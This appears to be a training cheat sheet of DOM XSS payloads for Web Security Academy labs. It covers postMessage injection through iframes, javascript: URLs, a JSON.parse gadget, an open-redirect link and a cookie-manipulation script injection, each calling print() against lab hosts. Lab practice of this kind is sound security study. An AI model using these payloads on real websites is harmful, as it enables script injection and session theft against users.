# DOM XSS
```html
// Using Web messages
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

// Using web messages with JS url

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>

// // postmessage sends a webmessage

// Using webmessage and JSON.parse

<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

// Open redirection

// // Look for: <a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;">Back to Blog</a>

https://YOUR-LAB-ID.web-security-academy.net/post?postId=6&url=https://exploit-0ace00c10347949c8131b02c01f10078.exploit-server.net/

// Cookie manipulation

// // Look for: document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'

        // Payload                                                                                                             // Redirect victim to homepage so exploit works without their input
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a4800a0048ef59b87968f4600050091.web-security-academy.net';window.x=1;">
```
